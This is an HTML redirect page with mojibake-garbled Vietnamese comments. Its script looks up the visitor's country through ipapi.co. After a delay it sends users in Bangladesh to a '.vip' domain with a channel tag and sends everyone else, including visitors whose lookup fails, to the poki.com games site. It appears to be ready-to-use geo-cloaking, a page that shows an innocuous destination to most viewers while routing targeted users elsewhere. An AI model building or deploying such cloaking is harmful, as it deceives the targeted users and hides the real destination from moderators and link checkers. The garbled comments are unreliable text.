<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Redirect...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    /* ·∫®n m·ªçi th·ª©, tr√°nh ch·ªõp n·ªôi dung */
    html, body {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      overflow: hidden;
      background: #000; /* ƒë·ªïi #fff n·∫øu b·∫°n th√≠ch n·ªÅn tr·∫Øng */
    }
  </style>
</head>
<body>
  <script>
    // üîó LINK ƒê√É G·∫ÆN S·∫¥N:
    // Web A: cho user ·ªü Bangladesh
    const BD_URL    = "https://www.khcyz.vip/?ch=4f80366d81";
    // Web B: cho t·∫•t c·∫£ qu·ªëc gia kh√°c
    const OTHER_URL = "https://poki.com";

    // Th·ªùi gian delay (ms): 1000 = 1s, 1500 = 1.5s, 2000 = 2s
    const DELAY = 1500;

    function redirectByCountry(countryCode) {
      // Chu·∫©n ho√°
      countryCode = (countryCode || "").toString().trim().toUpperCase();

      // üëâ Debug: xem n√≥ detect ra m√£ n∆∞·ªõc n√†o (khi ch·∫°y th·∫≠t c√≥ th·ªÉ xo√° d√≤ng n√†y)
      console.log("Detected country:", countryCode);

      setTimeout(function () {
        if (countryCode === "BD") {
          // Bangladesh ‚Üí Web A
          window.location.href = BD_URL;
        } else {
          // T·∫•t c·∫£ qu·ªëc gia kh√°c ‚Üí Web B
          window.location.href = OTHER_URL;
        }
      }, DELAY);
    }

    function detectCountryAndRedirect() {
      // API tr·∫£ v·ªÅ ƒë√∫ng 2 k√Ω t·ª± country-code (VD: BD, VN, US)
      fetch("https://ipapi.co/country/")
        .then(function (res) {
          return res.text();
        })
        .then(function (code) {
          redirectByCountry(code);
        })
        .catch(function (err) {
          console.log("Geo error:", err);
          // N·∫øu l·ªói API ‚Üí cho sang Web B cho an to√†n
          redirectByCountry("");
        });
    }

    // G·ªçi ngay khi load trang
    detectCountryAndRedirect();
  </script>
</body>
</html>
